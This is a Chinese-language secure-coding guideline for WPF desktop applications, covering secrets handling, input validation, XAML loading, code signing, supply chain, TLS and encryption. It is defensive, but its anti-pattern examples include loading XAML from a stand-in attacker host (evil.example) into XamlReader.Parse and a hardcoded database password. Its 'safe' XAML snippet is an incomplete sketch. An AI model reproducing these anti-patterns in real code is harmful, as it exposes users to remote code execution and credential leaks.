# 13 · 安全

> 更新历史：2026-08-21 创建。

桌面应用同样面临供应链、数据、注入与泄露风险。本篇约束 WPF 应用的敏感数据处理、输入验证、XAML 沙箱、代码签名与供应链。

## 1. 敏感数据处理

- **必须**：密码、令牌、连接串等敏感信息用系统凭据库（`Windows Credential Manager` / `DPAPI`）或安全存储，**禁止**硬编码在代码 / XAML / 配置文件
- **必须**：内存中的敏感字符串用完即清（`SecureString` 或不可变替换），**禁止**长期持有明文密码
- **必须**：日志与错误消息脱敏（密码、令牌、个人信息不落日志），**禁止**日志中打印连接串（联动 `12` 章第 6 节）
- **禁止**：把敏感数据写进资源字典 / XAML 字符串资源（`x:Key` 资源被反编译可见）

```csharp
// ❌ 硬编码连接串：反编译即得，甚至可能提交进 git 历史
var conn = "Server=tcp:db.prod.com;Database=Orders;User Id=sa;Password=P@ssw0rd!;";

// ✅ 系统凭据库：运行时读取，密钥不出现在代码与仓库
var credential = new NetworkCredential("sa", ReadPasswordFromCredentialManager("OrdersDb"));
var conn = $"Server=tcp:db.prod.com;Database=Orders;User Id={credential.UserName};" +
           $"Password={credential.Password};";
```

```csharp
// ❌ 日志打印连接串 / 令牌：日志泄露敏感信息，哪怕日志本身在本地
_logger.Info($"连接数据库：{conn}");   // conn 含密码

// ✅ 日志只记脱敏信息：连接串打码 / 不记录令牌本体
_logger.Info($"连接数据库：{MaskConnectionString(conn)}");
// 或直接不记录连接细节
```

## 2. 输入验证

- **必须**：所有用户输入（文本框、上传、粘贴）验证边界与格式，**禁止**直接信任并用于查询 / 渲染
- **必须**：SQL 参数化 / ORM 参数化，**禁止**字符串拼接 SQL（注入）
- **必须**：XAML 中渲染外部 HTML / 富文本用白名单或安全解析，**禁止**直接 `WebBrowser` 加载不可信内容（脚本注入）
- **应该**：文件路径 / 上传文件名做规范化与路径遍历防护（`Path.GetFullPath` 校验目标目录）
- **禁止**：用反射执行用户可控类型 / 方法（反射注入）

## 3. XAML 沙箱与部分信任

- **必须**：理解 WPF 信任级别——`Full Trust`（默认桌面应用）与 `Partial Trust`（已弃用）的边界，**禁止**假定部分信任沙箱存在
- **必须**：`XamlReader.Parse` 加载外部 XAML 时验证来源可信（外部 XAML 可触发任意代码执行），**禁止**加载不可信 XAML
- **禁止**：不可信环境下用 XAML 序列化传输数据（`XamlWriter` 含反射能力，联动 `04` 章）

```csharp
// ❌ 直接加载外部 XAML：若模板来自网络 / 用户，可执行任意类型构造，等于远程代码执行
var xaml = await httpClient.GetStringAsync("https://evil.example/template.xaml");
var element = (FrameworkElement)XamlReader.Parse(xaml);   // 不可信内容直接解析

// ✅ 只解析可信来源，并限制类型：明确白名单程序集 / 已验证来源
// 1. 仅加载已签名 / 应用自带的模板资源
// 2. 用 XamlSchemaContext 限制允许的类型（只允许自带控件，禁止任意 Type）
var allowed = new XamlSchemaContext();   // 按需配置 AllowPublicTypes 等限制
using var reader = XmlReader.Create(new StringReader(trustedXaml));
var element = (FrameworkElement)XamlReader.Load(reader, new ParserContext { XamlTypeMapper = ... });
```

## 4. 认证与授权

- **必须**：应用内权限检查集中在服务层 / 命令层（`CanExecute` 联动授权），**禁止**只在 UI 层判断（可绕过）
- **必须**：认证凭据不持久化明文，会话管理（登录态、超时）统一处理
- **禁止**：把用户角色 / 权限写进 XAML 静态资源（可被篡改，应服务端 / 服务层判定）
- **应该**：敏感操作二次确认（删除、导出），审计日志记录关键操作（谁、何时、做了什么）

## 5. 代码签名与完整性

- **必须**：发布版签名（Authenticode 代码签名证书），**禁止**未签名分发（SmartScreen 拦截 + 篡改风险）
- **必须**：更新包签名校验（下载后验签再安装），**禁止**未校验的自动更新（联动 `15` 章）
- **应该**：强名称 / 程序集签名策略统一，防篡改与依赖劫持
- **禁止**：接受任意源 DLL 旁加载（DLL 劫持防护：`LoadFrom` 路径受控）

## 6. 供应链安全

- **必须**：第三方包来源可信（私有源 + 版本锁定），**禁止**不可信源安装包
- **必须**：依赖漏洞扫描（NuGet 漏洞告警 / 供应链扫描工具），发布前核对（联动 `01` 章第 6 节）
- **禁止**：引入维护停止的控件库 / 包（无安全修复，联动 `01` 章第 6 节）
- **应该**：锁定依赖版本（`Directory.Packages.props` 或锁文件），构建可复现

## 7. HTTPS / 通信

- **必须**：网络通信走 HTTPS（TLS 1.2+），**禁止**明文 HTTP（凭证 / 数据泄露）
- **必须**：TLS 证书校验默认开启，**禁止**为调试关闭证书校验
- **应该**：敏感接口双向认证 / 令牌刷新机制，**禁止**长期静态令牌

## 8. 加密

- **必须**：敏感数据加密用行业标准算法（`AES-GCM` 等），**禁止**自研加密 / 弱哈希（`MD5`/`SHA1` 仅非安全用途）
- **必须**：密码存储用慢哈希（`Argon2` / `bcrypt` / `PBKDF2`），**禁止**明文 / 单次 `SHA` 存储密码
- **禁止**：硬编码加密密钥 / IV（密钥管理走凭据库或系统密钥链）

## 9. 威胁建模与渗透

- **应该**：新功能上线前做轻量威胁建模（数据流、信任边界、攻击面）
- **应该**：桌面应用攻击面（DLL 劫持、注入、进程间通信）纳入审查
- **禁止**：仅靠 UI 隐藏敏感操作（如隐藏按钮）——安全不在 UI 层（联动第 4 节）
